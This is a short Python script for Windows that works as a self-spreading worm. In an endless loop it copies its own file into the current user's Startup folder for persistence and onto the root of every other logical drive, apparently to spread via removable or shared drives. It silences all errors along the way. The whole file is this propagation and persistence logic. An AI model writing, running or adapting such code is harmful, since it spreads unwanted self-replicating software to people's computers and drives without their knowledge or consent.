import os
import shutil
import time

import win32api

def drivespreading():
    drives = win32api.GetLogicalDriveStrings().split('\\\x00')[:-1]

    while True:
        for drive in drives:
            try:
                if drive == 'C:':
                    startupfolder = '%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' % os.path.expanduser('~')
                    shutil.copy2(__file__, startupfolder)
                else:
                    shutil.copy2(__file__, drive)
                    pass
            except:
                pass
        time.sleep(3)

if __name__ == '__main__':
    drivespreading()